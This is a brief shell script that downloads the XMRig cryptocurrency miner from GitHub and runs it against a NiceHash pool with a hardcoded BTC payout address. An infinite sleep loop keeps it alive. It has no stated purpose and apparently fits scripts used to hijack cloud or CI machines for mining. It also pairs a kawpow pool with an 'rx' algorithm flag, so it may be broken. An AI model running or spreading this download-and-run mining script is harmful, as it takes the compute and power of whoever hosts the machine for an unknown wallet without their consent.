#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
tar xf xmrig-6.14.0-linux-x64.tar.gz
cd xmrig-6.14.0
./xmrig -o kawpow.eu-north.nicehash.com:3385 -a rx -k -u BTC:3PZFPSXnU3xroAjSnoyDRuv26JnoqSQvVK.Ghd -p x --cpu 4
while [ 1 ]; do
sleep 3
done
sleep 999
